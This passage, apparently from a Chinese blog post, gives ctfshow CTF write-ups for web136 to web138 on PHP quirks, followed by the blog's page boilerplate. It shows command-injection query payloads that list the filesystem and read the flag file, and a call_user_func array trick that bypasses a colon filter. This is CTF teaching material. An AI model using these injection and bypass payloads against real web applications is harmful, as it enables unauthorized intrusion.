+<h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">ls</span> / |<span class="hljs-built_in">tee</span> 1<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span> f149_15_h3r3 |<span class="hljs-built_in">tee</span> aa<br></code></pre></td></tr></table></figure>
+
+<h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow=ctfshow::getFlag<br></code></pre></td></tr></table></figure>
+
+<h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><p><code>strripos($_POST[&#39;ctfshow&#39;], &quot;:&quot;) &gt; -1</code> 的检查条件意味着只要 POST 数据中包含冒号，代码就会终止。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag<br></code></pre></td></tr></table></figure>
+
+<p>在 PHP 中，<code>call_user_func</code> 可以接收数组形式的参数来调用静态方法。这种方式可以绕过冒号检查，因为 <code>ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</code> 并不包含冒号。</p>
+<ul>
+<li><code>ctfshow[0]=ctfshow</code>：表示调用 <code>ctfshow</code> 类的方法。</li>
+<li><code>ctfshow[1]=getFlag</code>：表示调用 <code>getFlag</code> 方法。</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/" class="category-chain-item">每日一题</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/php%E7%89%B9%E6%80%A7/" class="print-no-link">#php特性</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ctfshow文件包含</div>
+      <div>http://example.com/2024/09/17/每日一题/ctfshowphp特性/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>orange</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年9月17日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/09/13/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="ctfshow文件包含">
+                        <span class="hidden-mobile">ctfshow文件包含</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+ 
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+<!--鼠标点击礼花特效-->
+<script async src="/js/fireworks.js"></script>
